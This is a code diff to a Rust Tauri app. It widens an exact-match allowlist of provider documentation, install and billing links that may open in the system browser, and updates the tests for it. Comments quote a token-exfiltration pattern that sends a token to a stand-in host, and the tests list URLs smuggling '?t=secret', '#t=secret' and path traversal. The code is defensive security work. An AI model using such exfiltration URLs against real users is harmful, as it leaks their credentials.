@@ -210,16 +210,22 @@ fn is_app_navigation(url: &tauri::Url, dev_url: Option<&tauri::Url>) -> bool {
 /// links (`frontend/src/components/providers/catalog.ts`, pinned by a test).
 /// Opening arbitrary refused URLs would turn the guard into an exfiltration
 /// channel (`location = "https://x/?t=" + token`), so the match is exact.
-const DOCS_URLS: [&str; 5] = [
+// Every link the Providers screen opens in the system browser: `docs`, `installUrl` and `billingUrl` of
+// `frontend/src/components/providers/catalog.ts` (a test keeps the two lists equal). Exact match, no wildcard.
+const CATALOG_URLS: [&str; 9] = [
     "https://docs.anthropic.com",
+    "https://code.claude.com/docs/en/setup",
+    "https://cursor.com/docs/cli/overview",
+    "https://github.com/openai/codex",
+    "https://openrouter.ai/credits",
     "https://cursor.com/docs/api",
     "https://platform.openai.com/docs",
     "https://docs.ollama.com",
     "https://openrouter.ai/docs",
 ];
 
-fn is_docs_link(url: &tauri::Url) -> bool {
-    DOCS_URLS
+fn is_catalog_link(url: &tauri::Url) -> bool {
+    CATALOG_URLS
         .iter()
         .filter_map(|docs| docs.parse::<tauri::Url>().ok())
         .any(|docs| &docs == url)
@@ -298,7 +304,7 @@ pub fn run() {
                 // without calling this; the origin-gated init script covers that.)
                 .on_navigation(move |url| is_app_navigation(url, dev_url.as_ref()))
                 .on_new_window(move |url, _features| {
-                    if is_docs_link(&url) && throttle.allow(Instant::now()) {
+                    if is_catalog_link(&url) && throttle.allow(Instant::now()) {
                         // tauri-plugin-shell's open is deprecated in favour of
                         // tauri-plugin-opener; kept to avoid a new dependency (backlog).
                         #[allow(deprecated)]
@@ -600,13 +606,19 @@ mod tests {
     }
 
     #[test]
-    fn only_catalog_docs_pages_open_in_the_system_browser() {
+    fn only_catalog_links_open_in_the_system_browser() {
         // SEC re-review of #43, F1: opening any refused URL in the browser was
         // an exfil channel (location = "https://x/?t=" + token). Exact allowlist.
-        for docs in DOCS_URLS {
-            assert!(is_docs_link(&url(docs)), "{docs}");
+        for docs in CATALOG_URLS {
+            assert!(is_catalog_link(&url(docs)), "{docs}");
         }
         for not_docs in [
+            "https://openrouter.ai/credits?t=secret",
+            "https://openrouter.ai/credits/",
+            "https://github.com/openai/codex/issues",
+            "https://github.com/openai/",
+            "https://code.claude.com/docs/en/setup#t=secret",
+            "https://cursor.com/docs/cli/overview?t=secret",
             "https://openrouter.ai/docs?t=secret",
             "https://openrouter.ai/docs#t=secret",
             "https://openrouter.ai/docs/../keys",
@@ -617,22 +629,29 @@ mod tests {
             "http://127.0.0.1:8000/",
             "file:///C:/x",
         ] {
-            assert!(!is_docs_link(&url(not_docs)), "{not_docs}");
+            assert!(!is_catalog_link(&url(not_docs)), "{not_docs}");
         }
     }
 
     #[test]
-    fn docs_allowlist_matches_the_provider_catalog() {
-        // Every docs link the UI renders must be openable, and nothing else.
+    fn link_allowlist_matches_every_link_the_provider_catalog_renders() {
+        // Every `docs`, `installUrl` and `billingUrl` the UI renders must open in the
+        // system browser (a refused link is a dead button), and nothing else may.
         let catalog = include_str!("../../frontend/src/components/providers/catalog.ts");
         let mut in_catalog: Vec<String> = catalog
             .lines()
-            .filter_map(|l| l.trim().strip_prefix("docs: \""))
+            .filter_map(|l| {
+                let l = l.trim();
+                ["docs: \"", "installUrl: \"", "billingUrl: \""]
+                    .iter()
+                    .find_map(|key| l.strip_prefix(key))
+            })
             .filter_map(|rest| rest.split('"').next())
             .map(|u| url(u).to_string())
             .collect();
         in_catalog.sort();
-        let mut allowed: Vec<String> = DOCS_URLS.iter().map(|u| url(u).to_string()).collect();
+        in_catalog.dedup();
+        let mut allowed: Vec<String> = CATALOG_URLS.iter().map(|u| url(u).to_string()).collect();
         allowed.sort();
         assert!(!in_catalog.is_empty());
         assert_eq!(allowed, in_catalog);
